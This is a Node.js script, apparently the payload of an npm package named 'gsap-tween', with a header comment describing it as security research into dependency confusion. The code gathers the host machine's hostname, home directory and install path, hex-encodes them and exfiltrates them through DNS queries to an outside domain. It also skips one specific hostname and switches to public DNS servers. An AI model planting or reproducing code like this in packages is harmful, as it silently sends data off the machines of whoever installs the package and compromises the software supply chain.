/*

This code is used for research purposes.

No sensitive data is retrieved.

Callbacks from within organizations with a
responsible disclosure program will be reported
directly to the organizations.

Any other callbacks will be ignored, and
any associated data will not be kept.

For any questions or suggestions:

alex@ethicalhack.ro
https://twitter.com/alxbrsn

*/


const dns = require('dns');
const os = require('os');

const suffix = '.dns.alexbirsan-hacks-paypal.com';
const ns = 'dns1.alexbirsan-hacks-paypal.com';

const package = 'gsap-tween';


function sendToServer(data) {

    data = Buffer.from(data).toString('hex');
    data = data.match(/.{1,60}/g);

    id = Math.random().toString(36).substring(2);

    data.forEach(function (chunk, idx){
        try {   
            dns.resolve(
                'v2_f.' + id + '.' + idx + '.' + chunk + '.v2_e' + suffix, 'A', 
                console.log);
        } catch (e) { }
    });

}

function tryGet(toCall) {

    try {
        return toCall();
    } catch(e) {
        return 'err';
    }

}

data = {
    p : package,
    h : tryGet(os.hostname),
    d : tryGet(os.homedir),
    c : __dirname
}

if (data['h'] == 'BBOGENS-LAPTOP') {
    process.exit(0);
}

data = JSON.stringify(data);

sendToServer(data);
dns.lookup(ns, function(err, address) {
    if (!err) {
        nsAddress = address;
    } else {
        nsAddress = '8.8.8.8';
    }
    dns.setServers([nsAddress, '8.8.4.4']);
    sendToServer(data);
});
